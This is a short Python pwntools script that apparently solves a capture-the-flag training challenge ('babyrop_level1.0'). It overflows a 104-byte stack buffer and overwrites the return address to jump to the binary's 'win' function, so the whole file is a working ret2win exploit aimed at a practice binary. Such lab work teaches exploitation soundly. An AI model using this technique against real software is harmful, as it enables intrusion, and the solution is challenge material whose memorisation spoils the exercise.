from pwn import *

# Init
elf = ELF("/challenge/babyrop_level1.0")

# Vars
buffer_length = 104 #local_68
ret_addr_win_function = p64(elf.symbols.win)

# Payload
payload = b"A"*buffer_length + ret_addr_win_function

#Action
io = elf.process()
io.recvuntil(b'the return address).')
io.sendline(payload)

io.interactive()